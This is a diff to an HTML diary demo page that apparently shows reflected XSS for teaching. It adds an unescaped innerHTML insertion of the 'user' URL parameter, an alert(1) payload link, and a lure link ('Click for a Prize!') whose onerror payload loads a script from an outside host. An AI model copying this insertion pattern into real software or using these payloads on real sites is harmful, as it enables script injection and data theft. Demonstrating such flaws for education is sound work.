@@ -19,12 +19,47 @@
   </head>
   <body>
     <h1>Diary</h1>
+    <p id="welcome"></p>
     <form id="diaryForm">
       <fieldset>
         <legend>Diary Editor</legend>
         <textarea name="diary" aria-label="diary"></textarea>
       </fieldset>
     </form>
+    <p>Intended link format: <a href="?user=SomeName">?user=SomeName</a></p>
+    <p>
+      Classic alert(1) XSS:
+      <a
+        id="xss-example"
+        href="?user=You<img hidden src='/fake-endpoint' onerror=alert(1);>"
+        >Click for a XSS</a
+      >
+    </p>
+    <p>
+      Evil link on another site (<a
+        href="?user=You<img hidden src='/fake-endpoint' onerror=document.body.appendChild(document.createElement('script')).type='module';document.body.lastChild.src='https://leaker.njg4ne.workers.dev/useful-print-library.js';>"
+        >Click for a Prize!</a
+      >) runs this code:
+    </p>
+    <p>
+      <code
+        >document.body.appendChild(document.createElement("script")).type =
+        "module"; document.body.lastChild.src =
+        "https://leaker.njg4ne.workers.dev/useful-print-library.js";</code
+      >
+    </p>
+    <script type="module">
+      // https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS
+      const params = new URLSearchParams(window.location.search);
+      const user = params.get("user");
+      const welcome = document.querySelector("#welcome");
+      if (Boolean(user)) {
+        const toInsert = user;
+        welcome.innerHTML = `Welcome back, ${toInsert}!`;
+      }
+      document.getElementById("xss-example").textContent =
+        "?user=You<img hidden src='/fake-endpoint' onerror=alert(1);>";
+    </script>
     <script type="module">
       const STORAGE_KEY = "diaryContent";
       const diaryForm = document.getElementById("diaryForm");
